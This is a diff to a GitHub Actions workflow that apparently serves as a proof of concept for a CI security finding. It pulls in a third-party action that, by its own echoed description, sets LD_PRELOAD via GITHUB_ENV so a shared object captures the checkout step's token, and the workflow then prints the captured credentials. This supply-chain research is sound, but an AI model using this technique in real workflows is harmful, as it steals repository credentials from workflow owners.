@@ -9,18 +9,17 @@ jobs:
   cross-boundary-test:
     runs-on: ubuntu-latest
     steps:
-      - name: Step 1 — Use third-party action (toofikz2)
-        uses: toofikz2/public-test-repo@main
+      - name: Step 1 — Use third-party action (toofikz2/env-setup-action)
+        uses: toofikz2/env-setup-action@main
 
-      - name: Step 2 — Standard checkout (trust boundary crossing)
+      - name: Step 2 — Standard checkout (trust boundary crossing point)
         uses: actions/checkout@v4
 
-      - name: Step 3 — Check if cross-boundary capture succeeded
+      - name: Step 3 — Verify cross-boundary credential capture
         run: |
           echo "=== CROSS-BOUNDARY LD_PRELOAD TEST ==="
-          echo "This workflow uses toofikz2/public-test-repo@main (a third-party action)"
-          echo "which sets LD_PRELOAD via GITHUB_ENV. The .so captures INPUT_TOKEN"
-          echo "from actions/checkout's process environment."
+          echo "Workflow owner: toofikz4"
+          echo "Action author:  toofikz2 (toofikz2/env-setup-action)"
           echo ""
           echo "LD_PRELOAD value: $LD_PRELOAD"
           echo ""
@@ -28,10 +27,10 @@ jobs:
             echo "CROSS-BOUNDARY CAPTURE SUCCEEDED:"
             cat /tmp/crossboundary_capture.txt
             echo ""
-            echo "FINDING: Third-party action (toofikz2) captured tokens from"
-            echo "checkout step running in workflow owner's (toofikz4) context."
-            echo "This proves the GITHUB_ENV blocklist gap enables cross-trust-boundary"
-            echo "credential capture via LD_PRELOAD."
+            echo "FINDING: Action author (toofikz2) captured credentials from"
+            echo "checkout step in workflow owner's (toofikz4) context via"
+            echo "LD_PRELOAD set through GITHUB_ENV (blocklist gap)."
           else
-            echo "No capture file found"
+            echo "No capture file — checking LD_PRELOAD loading..."
+            ls -la /tmp/env_capture.so 2>/dev/null || echo "No .so found"
           fi
